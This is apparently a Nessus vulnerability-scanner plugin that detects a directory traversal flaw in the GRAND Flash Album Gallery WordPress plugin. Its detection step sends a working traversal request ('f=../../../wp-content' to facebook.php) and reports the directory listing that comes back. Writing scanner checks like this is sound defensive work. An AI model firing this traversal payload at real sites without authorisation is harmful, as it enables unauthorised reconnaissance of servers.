#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64259);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_bugtraq_id(56236);
  script_osvdb_id(86700);

  script_name(english:"GRAND Flash Album Gallery Plugin for WordPress 'f' Parameter Traversal Arbitrary Directory Enumeration");
  script_summary(english:"Attempts to enumerate directories.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Grand Flash Album Gallery Plugin for WordPress installed on the
remote host is affected by a directory traversal vulnerability due to
a failure to properly sanitize user-supplied input to the 'f'
parameter of its 'facebook.php' script. This vulnerability allows an
unauthenticated, remote attacker to enumerate arbitrary directories on
the remote host using a request containing directory traversal
sequences.

The application is also reportedly affected by several information
disclosure, SQL injection, and arbitrary file-overwrite
vulnerabilities; however, Nessus has not tested for these issues.");
  script_set_attribute(attribute:"see_also", value:"http://www.waraxe.us/advisory-94.html");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/extend/plugins/flash-album-gallery/changelog/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.10 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/10/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/10/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/01/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'GRAND Flash Album Gallery';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "flash-album-gallery/admin/js/script.js"][0] =
    make_list('function FlAGClass\\(');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Attempt directory enumeration
traversal = "../../../wp-content";
url = "/wp-content/plugins/flash-album-gallery/facebook.php?i=1&f=" + traversal;

res = http_send_recv3(
  method       : "GET",
  item         : dir + url,
  port         : port,
  exit_on_fail : TRUE
);

get_path = egrep(pattern:"path :", string:res[2]);

if (!isnull(get_path) && traversal >< get_path)
{
  # Format our output for reporting. Limit to 10 lines
  count = 0;
  output = "";

  out = strstr(res[2], "flashvars :");
  foreach line (split(out))
  {
    output += line;
    count++;
    if (count >= 10) break;
  }

  if (report_verbosity > 0)
  {
    snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report =
      '\nNessus was able to verify the issue exists using the following request :' +
      '\n' +
      '\n' + install_url + url +
      '\n';
    if (report_verbosity > 1)
    {
      report +=
        '\n' + 'This produced the following truncated output :' +
        '\n' + snip +
        '\n' + chomp(output) +
        '\n' + snip +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
